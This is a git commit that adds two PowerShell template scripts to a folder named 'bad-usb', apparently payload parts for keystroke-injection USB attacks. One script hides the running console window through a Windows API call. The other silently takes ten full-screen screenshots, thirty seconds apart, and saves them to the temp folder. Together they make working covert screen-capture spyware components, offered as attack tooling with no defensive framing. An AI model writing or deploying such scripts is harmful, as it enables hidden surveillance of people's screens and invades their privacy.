181b9a0b90ef54c47833fbf537766c9e48069083
Simon Goldstone <5681879+simongoldstone@users.noreply.github.com>
2025-04-15 17:01:10 +0100

    initial

---
+++ bad-usb/.templates/powershell_hide_window.ps1
@@ -0,0 +1,19 @@
+﻿# this code attempts to hide the current window
+
+try {
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+    
+    if ($hwnd -ne [System.IntPtr]::Zero) {
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+    else {
+        $Host.UI.RawUI.WindowTitle = 'hidden'
+        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+        $hwnd = $Proc.MainWindowHandle
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+} catch {
+    # unable to hide
+}
---
+++ bad-usb/.templates/powershell_screenshots.ps1
@@ -0,0 +1,18 @@
+﻿$interval = 30 
+$a = 10
+
+While ($a -gt 0){
+
+Add-Type -AssemblyName System.Windows.Forms
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
+$filePath = "$env:temp\sc$a.png"
+$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose()
+$bitmap.Dispose()
+
+Start-Sleep $interval
+$a--
+}
